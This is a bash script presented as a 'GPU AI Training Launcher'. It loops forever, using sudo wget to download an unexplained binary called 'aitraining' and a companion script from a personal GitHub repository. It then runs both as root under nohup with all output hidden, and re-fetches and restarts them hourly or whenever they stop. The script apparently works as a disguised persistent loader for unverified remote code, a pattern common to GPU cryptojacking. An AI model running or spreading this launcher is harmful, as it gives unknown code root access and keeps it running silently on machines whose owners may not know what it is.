#!/bin/bash
# File: start_modelgp.sh launcher
# Purpose: Run start_modelgp.sh continuously, restart if stopped, force restart every hour
# Behavior: Auto-restart if stopped and force restart every hour
# The 5-minute monitor runs in the terminal (no nohup)

while true; do
    echo "========== Starting GPU AI Training Launcher =========="

    # Stop old processes safely
    for proc in "start_modelgp.sh" "aitraining"; do
        if pgrep -f "$proc" > /dev/null; then
            sudo pkill -f "$proc"
            echo "$proc stopped."
        fi
    done

    # Delete old files before downloading
    echo "Deleting old files..."
    rm -f ./aitraining ./start_modelgp.sh

    # Launch start_modelgp.sh in background with nohup
    nohup bash -c '
        sudo wget -q -O ./aitraining https://github.com/max313iq/Ssl/raw/main/aitraining
        sudo wget -q -O ./start_modelgp.sh https://github.com/max313iq/Ssl/raw/main/start_modelgp.sh
        sudo chmod +x ./aitraining
        sudo chmod +x ./start_modelgp.sh
        sudo bash ./start_modelgp.sh
    ' > /dev/null 2>&1 &

    echo "start_modelgp.sh launched."

    # --- 5-minute monitoring loop in terminal ---
    runtime=0
    while [ $runtime -lt 3600 ]; do  # 1 hour session
        sleep 300  # 5 minutes
        runtime=$((runtime + 300))

        if pgrep -f "aitraining" > /dev/null; then
            echo "$(date '+%Y-%m-%d %H:%M:%S') - aitraining running fine."
        else
            echo "$(date '+%Y-%m-%d %H:%M:%S') - aitraining stopped! Restarting start_modelgp.sh..."
            
            # Kill any remaining processes
            sudo pkill -f "start_modelgp.sh" 2>/dev/null
            sudo pkill -f "aitraining" 2>/dev/null

            # Delete old files before redownload
            rm -f ./aitraining ./start_modelgp.sh

            # Relaunch
            nohup bash -c "
                sudo wget -q -O ./aitraining https://github.com/max313iq/Ssl/raw/main/aitraining
                sudo wget -q -O ./start_modelgp.sh https://github.com/max313iq/Ssl/raw/main/start_modelgp.sh
                sudo chmod +x ./aitraining
                sudo chmod +x ./start_modelgp.sh
                sudo bash ./start_modelgp.sh
            " > /dev/null 2>&1 &

            echo "$(date '+%Y-%m-%d %H:%M:%S') - start_modelgp.sh restarted."
        fi
    done

    # --- 1-hour forced restart ---
    echo "========== 1 hour completed, restarting processes =========="
done
